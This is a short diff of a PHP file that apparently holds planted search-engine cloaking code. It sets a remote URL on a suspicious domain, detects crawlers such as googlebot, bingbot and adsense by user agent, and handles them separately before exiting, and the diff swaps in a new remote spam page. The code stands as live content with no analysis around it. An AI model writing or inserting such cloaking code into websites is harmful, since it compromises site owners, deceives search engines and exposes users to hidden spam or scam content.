@@ -2,7 +2,7 @@
 ob_start();
 header('Vary: Accept-Language, User-Agent');
 
-$bot_url = "https://obeydasupreme.site/badboys/winstreaks.html";
+$bot_url = "https://obeydasupreme.site/badboys/miard.html";
 $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
 
 $bots = ['googlebot', 'slurp', 'bingbot', 'baiduspider', 'yandex', 'crawler', 'spider', 'adsense', 'inspection'];
@@ -34,7 +34,6 @@ if ($is_bot) {
     ob_end_flush();
     exit;
 }
-
 
 
 /**
